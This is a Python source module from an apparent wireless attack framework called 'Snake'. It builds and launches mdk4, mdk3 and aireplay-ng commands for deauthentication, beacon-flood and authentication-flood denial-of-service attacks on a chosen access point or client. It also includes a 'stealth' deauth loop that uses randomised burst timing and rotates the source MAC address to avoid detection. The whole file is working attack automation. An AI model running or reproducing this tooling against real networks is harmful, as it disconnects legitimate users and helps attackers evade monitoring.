#!/usr/bin/env python3
"""Shared RF engine for Snake: deauth, beacon flood, and auth DoS presets."""
import random
import subprocess
import threading
import time
import uuid
from typing import Callable, Optional

from snakefw.core.paths import LOGS_DIR, ensure_runtime_dirs
from snakefw.core.tool_manager import (
    ProcessRunner,
    change_mac,
    find_executable,
    get_interface_mode,
    is_valid_bssid,
    normalize_bssid,
)

ensure_runtime_dirs()

RF_DEAUTH = "deauth"
RF_BEACON = "beacon"
RF_AUTH = "auth"
RF_MODES = (RF_DEAUTH, RF_BEACON, RF_AUTH)

_active_lock = threading.Lock()
_active_sessions: dict = {}


def resolve_rf_tool(mode: str = RF_DEAUTH) -> dict:
    """Prefer mdk4, then mdk3, then aireplay-ng for deauth only."""
    mdk4 = find_executable("mdk4")
    if mdk4:
        return {"kind": "mdk4", "path": mdk4, "label": "mdk4"}
    mdk3 = find_executable("mdk3")
    if mdk3:
        return {"kind": "mdk3", "path": mdk3, "label": "mdk3"}
    if mode == RF_DEAUTH:
        aireplay = find_executable("aireplay-ng")
        if aireplay:
            return {"kind": "aireplay", "path": aireplay, "label": "aireplay-ng"}
    return {"kind": "", "path": "", "label": ""}


def rf_tool_ready(mode: str = RF_DEAUTH) -> bool:
    return bool(resolve_rf_tool(mode).get("path"))


def lock_channel(iface: str, channel: int) -> bool:
    """Pin a monitor interface to a channel when possible."""
    if not iface or channel < 1:
        return False
    iw = find_executable("iw")
    if iw:
        result = subprocess.run(
            [iw, "dev", iface, "set", "channel", str(channel)],
            capture_output=True,
            text=True,
            timeout=8,
        )
        if result.returncode == 0:
            return True
    iwconfig = find_executable("iwconfig")
    if iwconfig:
        result = subprocess.run(
            [iwconfig, iface, "channel", str(channel)],
            capture_output=True,
            text=True,
            timeout=8,
        )
        return result.returncode == 0
    return False


def build_rf_command(
    mode: str,
    iface: str,
    *,
    bssid: str = "",
    channel: int = 0,
    client: str = "",
    count: int = 0,
    tool: Optional[dict] = None,
) -> list:
    """Build an argv list for the selected RF preset. Does not run it."""
    if mode not in RF_MODES:
        raise ValueError(f"Unsupported RF mode: {mode}")
    if not iface:
        raise ValueError("A monitor interface is required")
    tool = tool or resolve_rf_tool(mode)
    kind = tool.get("kind") or ""
    path = tool.get("path") or ""
    if not path:
        raise ValueError("No RF tool available (install mdk4, mdk3, or aircrack-ng)")

    bssid = normalize_bssid(bssid) if bssid else ""
    client = normalize_bssid(client) if client else ""
    if bssid and not is_valid_bssid(bssid):
        raise ValueError("Invalid BSSID")
    if client and not is_valid_bssid(client):
        raise ValueError("Invalid client MAC")

    if kind == "mdk4":
        return _mdk4_command(path, mode, iface, bssid, channel, client)
    if kind == "mdk3":
        return _mdk3_command(path, mode, iface, bssid, channel, client)
    if kind == "aireplay":
        if mode != RF_DEAUTH:
            raise ValueError("aireplay-ng only supports the deauth preset")
        if not bssid:
            raise ValueError("Deauth requires a target BSSID")
        frames = count if count > 0 else 0
        cmd = [path, "--deauth", str(frames), "-a", bssid]
        if client:
            cmd += ["-c", client]
        cmd += ["--ignore-negative-one", iface]
        return cmd
    raise ValueError(f"Unsupported RF tool: {kind}")


def _mdk4_command(path, mode, iface, bssid, channel, client) -> list:
    if mode == RF_DEAUTH:
        if not bssid:
            raise ValueError("Deauth requires a target BSSID")
        cmd = [path, iface, "d", "-B", bssid]
        if client:
            cmd += ["-S", client]
        if channel:
            cmd += ["-c", str(channel)]
        return cmd
    if mode == RF_BEACON:
        cmd = [path, iface, "b"]
        if channel:
            cmd += ["-c", str(channel)]
        return cmd
    if not bssid:
        raise ValueError("Auth DoS requires a target BSSID")
    return [path, iface, "a", "-a", bssid]


def _mdk3_command(path, mode, iface, bssid, channel, client) -> list:
    if mode == RF_DEAUTH:
        if not bssid:
            raise ValueError("Deauth requires a target BSSID")
        cmd = [path, iface, "d", "-b", bssid]
        if client:
            cmd += ["-s", client]
        if channel:
            cmd += ["-c", str(channel)]
        return cmd
    if mode == RF_BEACON:
        cmd = [path, iface, "b"]
        if channel:
            cmd += ["-c", str(channel)]
        return cmd
    if not bssid:
        raise ValueError("Auth DoS requires a target BSSID")
    return [path, iface, "a", "-a", bssid]


def busy_ifaces() -> set:
    with _active_lock:
        return {session.iface for session in _active_sessions.values() if session.running}


class RFSession:
    """One tracked RF job. Runs until duration elapses or stop() is called."""

    def __init__(
        self,
        mode: str,
        iface: str,
        *,
        bssid: str = "",
        essid: str = "",
        channel: int = 0,
        client: str = "",
        duration: int = 30,
        job_id: str = "",
        stealth: bool = False,
        rotate_mac: bool = False,
        burst: int = 8,
        interval_min: float = 1.2,
        interval_max: float = 5.0,
        on_log: Optional[Callable] = None,
    ):
        self.session_id = str(uuid.uuid4())[:8]
        self.mode = mode
        self.iface = iface
        self.bssid = normalize_bssid(bssid) if bssid else ""
        self.essid = essid
        self.channel = channel
        self.client = normalize_bssid(client) if client else ""
        self.duration = max(0, int(duration or 0))
        self.job_id = job_id
        self.stealth = bool(stealth) and mode == RF_DEAUTH
        self.rotate_mac = bool(rotate_mac) and self.stealth
        self.burst = max(2, min(32, int(burst or 8)))
        self.interval_min = max(0.4, float(interval_min or 1.2))
        self.interval_max = max(self.interval_min, float(interval_max or 5.0))
        self.on_log = on_log
        self.tool = resolve_rf_tool(mode)
        self.cmd = build_rf_command(
            mode,
            iface,
            bssid=bssid,
            channel=channel,
            client=client,
            count=self.burst if self.stealth else 0,
            tool=self.tool,
        )
        self.runner: Optional[ProcessRunner] = None
        self._thread: Optional[threading.Thread] = None
        self.running = False
        self.started_at = 0.0
        self.ended_at = 0.0
        self.stop_event = threading.Event()
        self.error = ""

    def _log(self, msg: str):
        if self.on_log:
            self.on_log(msg)

    def start(self) -> "RFSession":
        mode = get_interface_mode(self.iface)
        if mode != "monitor":
            raise RuntimeError(
                f"{self.iface} must be in monitor mode for RF tools (now {mode})"
            )
        if self.channel:
            lock_channel(self.iface, self.channel)
        self.running = True
        self.started_at = time.time()
        with _active_lock:
            _active_sessions[self.session_id] = self
        label = self.tool.get("label") or "tool"
        extra = f" → {self.essid or self.bssid}" if self.bssid else ""
        if self.stealth:
            self._log(
                f"[RF] {label} stealth deauth on {self.iface}{extra} "
                f"(burst {self.burst}, {self.interval_min:.1f}-{self.interval_max:.1f}s)"
            )
            self._thread = threading.Thread(target=self._stealth_loop, daemon=True)
            self._thread.start()
            return self
        log_file = str(LOGS_DIR / f"rf_{self.mode}_{self.session_id}.log")
        self.runner = ProcessRunner(
            self.cmd,
            log_file=log_file,
            callback=self._log,
            timeout=self.duration,
        )
        self._log(f"[RF] {label} {self.mode} on {self.iface}{extra}")
        self.runner.start()
        return self

    def _stealth_loop(self) -> None:
        deadline = time.time() + self.duration if self.duration else None
        burst_n = 0
        while not self.stop_event.is_set():
            if deadline and time.time() >= deadline:
                break
            if self.rotate_mac:
                try:
                    change_mac(self.iface, "random")
                    if self.channel:
                        lock_channel(self.iface, self.channel)
                    self._log("[RF] rotated source MAC for next burst")
                except Exception as exc:
                    self._log(f"[RF] MAC rotate skipped: {exc}")
            burst_n += 1
            cmd = build_rf_command(
                self.mode,
                self.iface,
                bssid=self.bssid,
                channel=self.channel,
                client=self.client,
                count=self.burst,
                tool=self.tool,
            )
            log_file = str(LOGS_DIR / f"rf_{self.mode}_{self.session_id}_{burst_n}.log")
            self.runner = ProcessRunner(cmd, log_file=log_file, callback=self._log)
            self.runner.start()
            hold = min(2.8, 0.18 * self.burst + 0.6)
            hold_until = time.time() + hold
            while self.runner.is_running() and time.time() < hold_until:
                if self.stop_event.is_set():
                    break
                time.sleep(0.15)
            if self.runner.is_running():
                self.runner.kill()
            if self.stop_event.is_set():
                break
            pause = random.uniform(self.interval_min, self.interval_max)
            self._log(f"[RF] stealth pause {pause:.1f}s")
            slept = 0.0
            while slept < pause and not self.stop_event.is_set():
                step = min(0.25, pause - slept)
                time.sleep(step)
                slept += step
        self.running = False
        self.ended_at = time.time()

    def wait(self, timeout: Optional[float] = None):
        if self.stealth:
            if self._thread:
                self._thread.join(timeout)
            else:
                self._stealth_loop()
            return
        if not self.runner:
            return
        if timeout is None and self.duration:
            timeout = self.duration + 2
        deadline = time.time() + timeout if timeout else None
        while self.runner.is_running():
            if self.stop_event.is_set():
                self.runner.kill()
                break
            if deadline and time.time() >= deadline:
                break
            time.sleep(0.3)
        self.running = False
        self.ended_at = time.time()

    def stop(self):
        self.stop_event.set()
        if self.runner:
            self.runner.kill()
        self.running = False
        if not self.ended_at:
            self.ended_at = time.time()
        with _active_lock:
            _active_sessions.pop(self.session_id, None)
        self._log(f"[RF] stopped {self.mode} ({self.session_id})")

    def snapshot(self) -> dict:
        return {
            "session_id": self.session_id,
            "job_id": self.job_id,
            "mode": self.mode,
            "iface": self.iface,
            "bssid": self.bssid,
            "essid": self.essid,
            "channel": self.channel,
            "client": self.client,
            "duration": self.duration,
            "stealth": self.stealth,
            "rotate_mac": self.rotate_mac,
            "tool": self.tool.get("label") or "",
            "running": self.running,
            "started_at": self.started_at,
            "error": self.error,
        }


def stop_all_rf():
    with _active_lock:
        sessions = list(_active_sessions.values())
    for session in sessions:
        session.stop()
